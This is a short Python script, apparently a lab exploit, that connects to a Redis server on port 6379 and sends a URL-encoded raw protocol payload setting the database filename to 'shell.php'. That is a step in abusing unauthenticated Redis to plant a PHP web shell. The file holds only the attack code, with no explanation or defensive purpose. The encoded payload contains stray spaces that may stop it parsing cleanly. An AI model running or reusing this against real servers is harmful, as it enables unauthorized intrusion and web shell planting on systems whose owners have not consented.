import socket
import traceback
from urllib import parse
exp = "%20%20%20%20%2A4%0D%0A%20%20%20%20%246%0D%0A%20%20%20%20config%0D%0A%20%20%20%20%243%0D%0A%20%20%20%20set%0D%0A%20%20%20%20%2410%0D%0A%20%20%20%20dbfilename%0D%0A%20%20%20%20%249%0D%0A%20%20%20%20shell.php"
exp = parse.unquote(exp)
tcp_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp_client.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
tcp_client.bind(('192.168.126.1', 26544))
try:

        tcp_client.connect(("192.168.126.131", 6379))
        tcp_client.settimeout(5)
        #print(tcp_client.recv(1024))
        tcp_client.send(str.encode(exp))
        tcp_client.recv(1024)
except socket.error:
        print('fail to setup socket connection'+str(traceback.print_exc()))
